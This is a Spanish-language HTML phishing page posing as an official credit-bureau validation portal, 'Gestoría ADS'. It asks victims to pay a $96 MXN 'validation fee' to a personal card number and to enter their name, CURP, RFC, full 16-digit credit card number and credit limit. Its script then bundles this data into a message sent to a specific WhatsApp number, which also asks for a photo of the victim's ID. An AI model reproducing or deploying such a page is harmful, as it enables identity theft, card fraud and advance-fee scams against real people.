<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gestoría ADS - Panel Oficial</title>
    <style>
        :root {
            --primary-blue: #1a5276;
            --secondary-blue: #2980b9;
            --light-bg: #f4f7f9;
            --white: #ffffff;
        }

        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: var(--light-bg);
            display: flex;
            justify-content: center;
            padding: 20px;
            margin: 0;
        }

        .container {
            background: var(--white);
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            max-width: 500px;
            width: 100%;
            border-top: 8px solid var(--primary-blue);
        }

        .logos-header {
            display: flex;
            justify-content: space-around;
            align-items: center;
            margin-bottom: 25px;
            padding-bottom: 15px;
            border-bottom: 1px solid #eee;
        }

        .logo-item {
            max-height: 55px;
            max-width: 120px;
            object-fit: contain;
        }

        .brand-header { text-align: center; margin-bottom: 20px; }
        .brand-header h1 { color: var(--primary-blue); font-size: 1.5rem; margin: 0; text-transform: uppercase; }

        .payment-card {
            background: linear-gradient(135deg, #1a5276 0%, #2980b9 100%);
            color: white;
            padding: 15px;
            border-radius: 12px;
            text-align: center;
            margin-bottom: 20px;
        }

        .account-num { font-size: 1.2rem; font-weight: bold; display: block; margin: 5px 0; letter-spacing: 1px; }

        .section-label { display: block; font-size: 0.75rem; color: var(--primary-blue); text-transform: uppercase; margin: 15px 0 10px 0; font-weight: 700; border-bottom: 1px solid #eee; }

        .input-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: 600; font-size: 0.85rem; color: #333; }
        input, select { 
            width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; 
            box-sizing: border-box; font-size: 15px; outline-color: var(--secondary-blue);
        }

        #seccionExtra { display: none; background: #f8fbff; padding: 15px; border-radius: 10px; border: 1px solid #e1e8ef; margin-bottom: 15px; }

        .btn-submit {
            width: 100%;
            padding: 16px;
            background-color: var(--primary-blue);
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-size: 1rem;
            font-weight: bold;
            text-transform: uppercase;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        .spinner { border: 4px solid rgba(0,0,0,0.1); border-top: 4px solid var(--primary-blue); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container" id="mainContainer">
    <div class="logos-header">
        <img src="buro1.jpg" alt="Buró" class="logo-item">
        <img src="ads.jpeg" alt="ADS" class="logo-item">
    </div>

    <div class="brand-header">
        <h1>Gestoría ADS</h1>
    </div>

    <div class="payment-card">
        <small>PAGO DE VALIDACIÓN ($96.00 MXN)</small>
        <span class="account-num">4027 6653 1037 4161</span>
        <strong>Andrés García Martínez</strong>
    </div>

    <form id="buroForm" autocomplete="off">
        <span class="section-label">Datos de Identificación (RFC / CURP)</span>
        
        <div class="input-group">
            <label>Nombre(s)</label>
            <input type="text" id="nombres" required autocomplete="new-password">
        </div>
        
        <div style="display: flex; gap: 10px;">
            <div class="input-group" style="flex:1;">
                <label>Apellido Paterno</label>
                <input type="text" id="paterno" required autocomplete="new-password">
            </div>
            <div class="input-group" style="flex:1;">
                <label>Apellido Materno</label>
                <input type="text" id="materno" required autocomplete="new-password">
            </div>
        </div>

        <div style="display: flex; gap: 10px;">
            <div class="input-group" style="flex:1;">
                <label>CURP</label>
                <input type="text" id="curp" maxlength="18" required style="text-transform: uppercase;" autocomplete="new-password">
            </div>
            <div class="input-group" style="flex:1;">
                <label>RFC</label>
                <input type="text" id="rfc" maxlength="13" required style="text-transform: uppercase;" autocomplete="new-password">
            </div>
        </div>

        <span class="section-label">Validación Financiera</span>
        <div class="input-group">
            <label>¿Cuenta con Tarjeta de Crédito activa?</label>
            <select id="tieneTarjeta" onchange="toggleSeccion()" required>
                <option value="">Seleccione una opción...</option>
                <option value="si">Sí, cuento con tarjeta</option>
                <option value="no">No tengo tarjeta (Solo Débito)</option>
            </select>
        </div>

        <div id="seccionExtra">
            <div class="input-group">
                <label>Número de Tarjeta (16 dígitos)</label>
                <input type="text" id="tarjeta" maxlength="16" placeholder="0000 0000 0000 0000">
            </div>
            <div class="input-group">
                <label>Límite de Crédito</label>
                <input type="number" id="limite" placeholder="Ej. 10000">
            </div>
        </div>

        <button type="submit" class="btn-submit">Generar Solicitud WhatsApp</button>
    </form>
</div>

<script>
    const form = document.getElementById('buroForm');
    const tarjetaInput = document.getElementById('tarjeta');
    const seccionExtra = document.getElementById('seccionExtra');
    const container = document.getElementById('mainContainer');

    function toggleSeccion() {
        const val = document.getElementById('tieneTarjeta').value;
        seccionExtra.style.display = (val === 'si') ? 'block' : 'none';
        tarjetaInput.required = (val === 'si');
    }

    tarjetaInput.addEventListener('input', function() {
        this.value = this.value.replace(/[^0-9]/g, '');
    });

    form.addEventListener('submit', function(e) {
        e.preventDefault();
        const seleccion = document.getElementById('tieneTarjeta').value;
        
        if (seleccion === 'si' && tarjetaInput.value.length !== 16) {
            alert("Atención: Para trámites de Buró se requieren los 16 dígitos de su tarjeta.");
            return;
        }

        const nom = document.getElementById('nombres').value.toUpperCase();
        const pat = document.getElementById('paterno').value.toUpperCase();
        const mat = document.getElementById('materno').value.toUpperCase();
        const curp = document.getElementById('curp').value.toUpperCase();
        const rfc = document.getElementById('rfc').value.toUpperCase();
        const tjt = (seleccion === 'si') ? tarjetaInput.value : "NO CUENTA CON TARJETA";
        const lim = document.getElementById('limite').value || "0";

        const msg = `*GESTIÓN DE TRÁMITE ADS*\n\n` +
                    `📝 *DATOS DEL CLIENTE:*\n` +
                    `• *Nombre:* ${nom} ${pat} ${mat}\n` +
                    `• *CURP:* ${curp}\n` +
                    `• *RFC:* ${rfc}\n\n` +
                    `💳 *VALIDACIÓN BANCARIA:*\n` +
                    `• *Tarjeta:* ${tjt}\n` +
                    `• *Límite:* $${lim}\n\n` +
                    `💰 *DEPÓSITO:* $96.00 (Andrés García)\n\n` +
                    `✅ *SIGUIENTE PASO:* Por favor envíe foto de su INE y su comprobante aquí debajo.`;

        const whatsappUrl = `https://wa.me/522382035958?text=${encodeURIComponent(msg)}`;
        
        container.innerHTML = `
            <div style="text-align:center; padding: 50px;">
                <div class="spinner"></div>
                <p>Generando reporte oficial...</p>
                <p style="font-size: 0.8em; color: gray;">Redirigiendo a WhatsApp</p>
            </div>`;
            
        setTimeout(() => { window.location.href = whatsappUrl; }, 1800);
    });
</script>

</body>
</html>
